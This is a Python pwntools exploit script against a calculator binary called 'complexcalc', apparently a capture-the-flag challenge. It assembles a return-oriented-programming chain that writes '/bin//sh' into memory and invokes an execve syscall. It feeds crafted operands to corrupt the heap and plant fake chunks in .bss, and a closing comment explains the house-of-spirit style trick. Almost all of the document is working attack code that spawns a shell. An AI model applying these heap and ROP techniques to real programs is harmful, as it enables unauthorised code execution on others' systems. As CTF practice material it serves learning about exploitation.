from pwn import *
from struct import pack

r = process("./complexcalc")

chain = []

chain.append(0x401c87) # pop rsi ; ret
chain.append(0x6c1060) # @ .data
chain.append(0x44db34) # pop rax ; ret
chain.append(0x6e69622f) # '/bin//sh'
chain.append(0x68732f2f)
chain.append(0x470f11) # mov qword ptr [rsi], rax ; ret
chain.append(0x401c87) # pop rsi ; ret
chain.append(0x6c1068) # @ .data + 8
chain.append(0x41c61f) # xor rax, rax ; ret
chain.append(0x470f11) # mov qword ptr [rsi], rax ; ret
chain.append(0x401b73) # pop rdi ; ret
chain.append(0x6c1060) # @ .data
chain.append(0x401c87) # pop rsi ; ret
chain.append(0x6c1068) # @ .data + 8
chain.append(0x437a85) # pop rdx ; ret
chain.append(0x6c1068) # @ .data + 8

chain.append(0x41c61f) # xor rax, rax ; ret
chain.append(0x463ba0) # add rax, 3 ; ret
chain.append(0x463ba0) # add rax, 3 ; ret
chain.append(0x463ba0) # add rax, 3 ; ret
chain.append(0x463ba0) # add rax, 3 ; ret
chain.append(0x463ba0) # add rax, 3 ; ret
chain.append(0x463ba0) # add rax, 3 ; ret
chain.append(0x463ba0) # add rax, 3 ; ret
chain.append(0x463ba0) # add rax, 3 ; ret
chain.append(0x463ba0) # add rax, 3 ; ret
chain.append(0x463ba0) # add rax, 3 ; ret
chain.append(0x463ba0) # add rax, 3 ; ret
chain.append(0x463ba0) # add rax, 3 ; ret
chain.append(0x463ba0) # add rax, 3 ; ret
chain.append(0x463ba0) # add rax, 3 ; ret
chain.append(0x463ba0) # add rax, 3 ; ret
chain.append(0x463ba0) # add rax, 3 ; ret
chain.append(0x463ba0) # add rax, 3 ; ret
chain.append(0x463ba0) # add rax, 3 ; ret
chain.append(0x463ba0) # add rax, 3 ; ret
chain.append(0x463b87) # add rax, 2 ; ret

chain.append(0x400488) # syscall

r.sendline("255")

for i in range(12):
	r.sendline("1")
	r.sendline(str(4294967296 / 2))
	r.sendline(str(4294967296 / 2))

r.sendline("1")
r.sendline(str(40))
r.sendline(str(0x6c4aa0 - 40))

r.sendline("1")
r.sendline(str(4294967296 / 2))
r.sendline(str(4294967296 / 2))

for i in range(4):
	r.sendline("1")
	r.sendline(str(4294967296 / 2))
	r.sendline(str(4294967296 / 2))


for gadget in chain:
	r.sendline("1")
	r.sendline(str(40))
	r.sendline(str(gadget - 40))

	if (gadget == 0x6e69622f or gadget == 0x68732f2f):
		continue

	r.sendline("1")
	r.sendline(str(4294967296 / 2))
	r.sendline(str(4294967296 / 2))

r.sendline("4")
r.sendline(str(0x20*2*0x20))
r.sendline(str(0x20*2))

r.sendline("2")
r.sendline(str(0x51 + 40))
r.sendline(str(40))

r.sendline("5")
r.interactive()


'''
- we cannot free(0) anymore -> have to overwrite ptr with valid address 
- have to fix errors:
	free(): invalid pointer
	free(): invalid next size (fast)

- solution - we make fake chunks on .bss with the help of the operands data structres thingies
- we have to put a fake size for our chunk and a fake size of the next chunk  (think house of spirit)
- min chunk size doesn't have to be 0x50 (adds(40+40)), you have substract and division FOOL
'''